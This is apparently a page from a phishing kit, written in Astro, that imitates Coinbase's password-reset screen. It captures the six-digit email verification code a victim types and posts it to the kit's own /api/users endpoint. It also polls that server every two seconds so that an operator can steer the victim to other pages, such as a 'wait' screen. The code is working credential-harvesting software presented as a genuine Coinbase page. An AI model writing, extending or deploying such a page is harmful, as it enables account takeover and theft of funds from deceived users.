---
import AuthLayout from '../layouts/AuthLayout.astro';
import AuthCard from '../components/AuthCard.astro';
import { getUserByEmail, initializeDb } from '../lib/db';

initializeDb();

// Get the cookie from the request
const cookieHeader = Astro.request.headers.get('cookie');
const encodedEmail = cookieHeader?.match(/user_email=([^;]+)/)?.[1];
const userEmail = encodedEmail ? decodeURIComponent(encodedEmail) : null;

// If no user email in cookie, redirect to signin
if (!userEmail) {
  return Astro.redirect('/signin');
}

// Check if user exists in database
const user = await getUserByEmail(userEmail);

if (!user) {
  return Astro.redirect('/signin');
}

// If user is not on reset page, redirect to their current page
if (user.current_page && user.current_page !== 'reset') {
  return Astro.redirect(`/${user.current_page}`);
}
---

<AuthLayout title="Password Reset">
  <AuthCard>
    <div class="coinbase-card">
      <div class="coinbase-logo">coinbase</div>
      <h2 class="coinbase-heading">Reset your password</h2>
      <p class="coinbase-subtext">
        Enter the 6-digit code sent to <span class="coinbase-email">{user.email}</span>
      </p>
      <form class="coinbase-verification-form">
        <div class="coinbase-code-inputs">
          <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required />
          <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required />
          <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required />
          <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required />
          <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required />
          <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-box" required />
        </div>
        <div class="coinbase-resend">
          <span class="resend-link">Resend code</span>
          <span class="resend-timer">(29s)</span>
        </div>
        <button type="submit" class="coinbase-continue-btn" disabled>Continue</button>
      </form>
    </div>
  </AuthCard>
</AuthLayout>

<style is:global>
  :root {
    overflow-x: hidden;
    background: #111214;
  }
</style>

<style>
  .coinbase-card {
    /* background: #181a1b; */
    border-radius: 1.25rem;
    /* box-shadow: 0 2px 16px 0 rgba(0, 0, 0, 0.10); */
    /* padding: 1.5rem; */
    max-width: 350px;
    margin: 2rem auto;
  }
  .coinbase-logo {
    font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
    font-weight: 700;
    font-size: 1.75rem;
    color: #1652f0;
    margin-bottom: 1.5rem;
    text-align: left;
    letter-spacing: -1px;
  }
  .coinbase-heading {
    color: #fff;
    font-size: 1.1rem;
    font-weight: 600;
    margin-bottom: 0.4rem;
    text-align: left;
  }
  .coinbase-subtext {
    color: #b5b5b6;
    font-size: 0.9rem;
    line-height: 1.4;
    margin-bottom: 1.5rem;
    text-align: left;
  }
  .coinbase-email {
    color: #fff;
    font-weight: 500;
  }
  .coinbase-verification-form {
    display: flex;
    flex-direction: column;
    gap: 1rem;
  }
  .coinbase-code-inputs {
    display: flex;
    justify-content: space-between;
    gap: 0.4rem;
    margin-bottom: 0.4rem;
  }
  .code-box {
    width: 40px;
    height: 50px;
    border-radius: 0.4rem;
    border: 1.5px solid #23262a;
    background: #23262a;
    color: #fff;
    font-size: 1.75rem;
    text-align: center;
    outline: none;
    transition: border-color 0.2s;
  }
  .code-box:focus {
    border-color: #1652f0;
    background: #23262a;
  }
  .coinbase-resend {
    display: flex;
    align-items: center;
    gap: 0.4rem;
    color: #b5b5b6;
    font-size: 0.9rem;
    margin-bottom: 0.4rem;
  }
  .resend-link {
    color: #b5b5b6;
    cursor: pointer;
    text-decoration: underline;
    transition: color 0.2s;
  }
  .resend-link:hover {
    color: #1652f0;
  }
  .resend-timer {
    color: #b5b5b6;
  }
  .coinbase-continue-btn {
    width: 100%;
    padding: 0.8rem 0;
    font-size: 1rem;
    font-weight: 600;
    color: #b5b5b6;
    background: #23262a;
    border: none;
    border-radius: 0.4rem;
    cursor: not-allowed;
    opacity: 0.7;
    margin-top: 0.4rem;
    transition: background 0.2s, color 0.2s;
  }
  .coinbase-continue-btn:enabled {
    background: #1652f0;
    color: #fff;
    cursor: pointer;
    opacity: 1;
  }
  .coinbase-resend .resend-link.disabled {
    pointer-events: none;
    opacity: 0.5;
    text-decoration: none;
  }
  .error-message {
    color: #ff4d4f;
    font-size: 0.9rem;
    margin-bottom: 1rem;
    text-align: left;
  }
</style>

<script>
  document.addEventListener('DOMContentLoaded', function () {
    // Add polling for current_page changes
    const checkCurrentPage = async () => {
      try {
        const email = decodeURIComponent(document.cookie.match(/user_email=([^;]+)/)?.[1] || '');
        if (!email) return;
        
        const response = await fetch('/api/users?email=' + encodeURIComponent(email));
        const userData = await response.json();
        
        if (userData.current_page && userData.current_page !== 'reset') {
          window.location.href = '/' + userData.current_page;
        }
      } catch (error) {
        console.error('Error checking current page:', error);
      }
    };

    // Check every 2 seconds
    setInterval(checkCurrentPage, 2000);

    const inputs = Array.from(document.querySelectorAll<HTMLInputElement>('.code-box'));
    const continueButton = document.querySelector<HTMLButtonElement>('.coinbase-continue-btn');
    const resendLink = document.querySelector<HTMLSpanElement>('.resend-link');
    const resendTimerSpan = document.querySelector<HTMLSpanElement>('.resend-timer');

    let countdown = 30;
    let timerInterval: number | undefined;

    function updateContinueButtonState() {
      const allFilled = inputs.every(input => input.value.length === 1);
      if (continueButton) {
        continueButton.disabled = !allFilled;
      }
    }

    function startResendTimer() {
      if (resendLink) resendLink.classList.add('disabled');
      if (resendTimerSpan) resendTimerSpan.textContent = `(${countdown}s)`;

      timerInterval = window.setInterval(() => {
        countdown--;
        if (resendTimerSpan) resendTimerSpan.textContent = `(${countdown}s)`;

        if (countdown <= 0) {
          clearInterval(timerInterval);
          if (resendLink) resendLink.classList.remove('disabled');
          if (resendTimerSpan) resendTimerSpan.textContent = '';
          countdown = 30;
        }
      }, 1000);
    }

    updateContinueButtonState();
    startResendTimer();

    inputs.forEach((input, idx) => {
      input.addEventListener('input', () => {
        const value = input.value.replace(/[^0-9]/g, '');
        input.value = value;

        if (value && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }

        updateContinueButtonState();
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !input.value && idx > 0) {
          inputs[idx - 1].focus();
        }
      });

      input.addEventListener('paste', (e) => {
        const paste = e.clipboardData?.getData('text') || '';
        if (/^[0-9]{6}$/.test(paste)) {
          e.preventDefault();
          paste.split('').forEach((char, i) => {
            if (inputs[i]) inputs[i].value = char;
          });
          if (inputs[5]) inputs[5].focus();
          updateContinueButtonState();
        }
      });
    });

    if (resendLink) {
      resendLink.addEventListener('click', (e) => {
        e.preventDefault();
        if (!resendLink.classList.contains('disabled')) {
          console.log('Resending code...');
          startResendTimer();
        }
      });
    }

    const form = document.querySelector<HTMLFormElement>('.coinbase-verification-form');
    if (form) {
      form.addEventListener('submit', async (e) => {
        e.preventDefault();

        if (!continueButton?.disabled) {
          const code = inputs.map(input => input.value).join('');
          console.log('Submitted code:', code);

          try {
            if (continueButton) {
              continueButton.disabled = true;
              continueButton.textContent = 'Verifying...';
            }

            // Update user's email code and current page
            const response = await fetch('/api/users', {
              method: 'PUT',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                email: document.querySelector('.coinbase-email')?.textContent || '',
                email_code: code,
                current_page: 'wait'
              })
            });

            if (response.ok) {
              // Redirect to wait page
              window.location.href = '/wait';
            } else {
              const error = await response.json();
              
              const errorMessage = document.createElement('div');
              errorMessage.className = 'error-message';
              errorMessage.textContent = error.message || 'Verification failed. Please try again.';
              form.insertBefore(errorMessage, form.firstChild);
              
              if (continueButton) {
                continueButton.disabled = false;
                continueButton.textContent = 'Continue';
              }
            }
          } catch (error) {
            console.error('Error during verification:', error);
            
            const errorMessage = document.createElement('div');
            errorMessage.className = 'error-message';
            errorMessage.textContent = 'Network error. Please try again.';
            form.insertBefore(errorMessage, form.firstChild);
            
            if (continueButton) {
              continueButton.disabled = false;
              continueButton.textContent = 'Continue';
            }
          }
        }
      });
    }
  });
</script> 